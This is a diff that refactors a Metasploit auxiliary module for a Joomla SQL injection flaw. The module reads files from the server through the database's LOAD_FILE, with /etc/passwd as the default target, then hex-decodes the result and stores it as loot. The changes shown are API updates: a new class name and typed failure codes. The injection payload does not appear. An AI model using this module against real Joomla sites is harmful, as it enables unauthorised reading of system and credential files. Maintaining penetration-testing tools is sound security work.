@@ -1,14 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-require 'msf/core'
-
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
@@ -38,7 +33,7 @@ class Metasploit3 < Msf::Auxiliary
         OptString.new('TARGETURI', [ true, "Base Joomla directory path", '/']),
         OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/passwd"]),
         OptInt.new('CATEGORYID', [true, "The category ID to use in the SQL injection", 0])
-      ], self.class)
+      ])
 
   end
 
@@ -97,24 +92,24 @@ class Metasploit3 < Msf::Auxiliary
     })
 
     if !resp or !resp.body
-      fail_with("Server did not respond in an expected way. Verify the IP address.")
+      fail_with(Failure::UnexpectedReply, "Server did not respond in an expected way. Verify the IP address.")
     end
 
     if resp.body =~ /404<\/span> Category not found/
-      fail_with("The category ID was invalid. Please try again with a valid category ID")
+      fail_with(Failure::BadConfig, "The category ID was invalid. Please try again with a valid category ID")
     end
 
     file = /#{front_marker}(.*)#{back_marker}/.match(resp.body)
 
     if !file
-      fail_with("Either the file didn't exist or the server has been patched.")
+      fail_with(Failure::UnexpectedReply, "Either the file didn't exist or the server has been patched.")
     end
 
     file = file[1].gsub(front_marker, '').gsub(back_marker, '')
     file = [file].pack("H*")
 
     if file == '' or file == "\x00"
-      fail_with("Either the file didn't exist or the database user does not have LOAD_FILE permissions")
+      fail_with(Failure::UnexpectedReply, "Either the file didn't exist or the database user does not have LOAD_FILE permissions")
     end
 
     path = store_loot("joomla.file", "text/plain", datastore['RHOST'], file, datastore['FILEPATH'])
@@ -124,4 +119,3 @@ class Metasploit3 < Msf::Auxiliary
     end
   end
 end
-
